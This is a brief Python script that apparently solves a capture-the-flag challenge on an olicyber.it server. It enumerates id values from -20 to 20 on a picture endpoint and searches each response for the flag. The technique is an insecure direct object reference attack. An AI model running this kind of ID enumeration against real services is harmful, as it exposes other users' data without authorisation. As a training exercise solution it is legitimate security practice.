#!/usr/bin/env python3
import requests, re

SITE = "http://gabibbo_friend.challs.olicyber.it/get-picture?id="
REGEX = r"flag{.*?}"

for i in range(-20, 21):
    r = requests.get(SITE + str(i))
    flag = re.findall(REGEX, r.text)
    if flag:
        print(flag[0])
        break